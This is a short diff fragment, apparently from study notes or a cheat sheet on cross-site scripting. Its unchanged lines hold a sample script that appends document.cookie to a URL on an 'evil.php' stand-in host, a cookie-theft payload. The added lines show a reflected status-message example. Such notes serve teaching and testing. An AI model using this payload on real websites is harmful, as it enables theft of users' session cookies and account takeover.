@@ -131,3 +131,5 @@
 		- <SCRIPT type="text/javascript">
 		  var adr = '../evil.php?cakemonster=' + escape(document.cookie);
 		  </SCRIPT>
+		- https://insecure-website.com/status?message=All+is+well.
+		  <p>Status: All is well.</p>
